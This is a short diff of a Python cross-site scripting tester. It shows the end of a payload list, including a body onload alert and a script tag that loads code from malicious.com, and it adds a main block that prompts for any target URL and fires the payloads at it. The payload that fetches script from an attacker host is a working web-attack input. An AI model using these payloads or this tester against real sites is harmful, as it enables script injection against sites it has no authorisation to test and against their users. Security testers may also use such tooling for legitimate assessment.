@@ -74,3 +74,7 @@ xss_payloads = [
         "<body onload=alert('XSS')>",
         "<script src='http://malicious.com/xss.js'></script>"
     ]
+
+if __name__ == "__main__":
+    target_url = input("Enter the target url : ")
+    test_xss(target_url, xss_payloads)
